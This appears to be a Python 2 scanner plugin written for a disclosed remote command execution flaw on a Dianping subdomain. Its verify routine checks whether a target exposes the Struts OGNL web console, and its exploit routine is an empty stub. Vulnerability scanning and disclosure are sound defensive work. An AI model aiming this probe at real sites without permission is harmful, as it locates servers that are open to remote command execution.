# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'www_0000' # 平台漏洞编号，留空
    name = '大众点评某分站存在远程命令执行漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2014-12-04'  # 漏洞公布时间
    desc = '''
       大众点评某分站存在远程命令执行漏洞. 
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=080076' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = '大众点评某分站'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '75e0894c-5329-40f9-80a8-432c43dc37b4'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/struts/webconsole.html'
            url = '{target}'.format(target=self.target)+payload
            code, head, res, errcode, _ = hh.http(url)
                       
            if code == 200 and "Welcome to the OGNL console" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()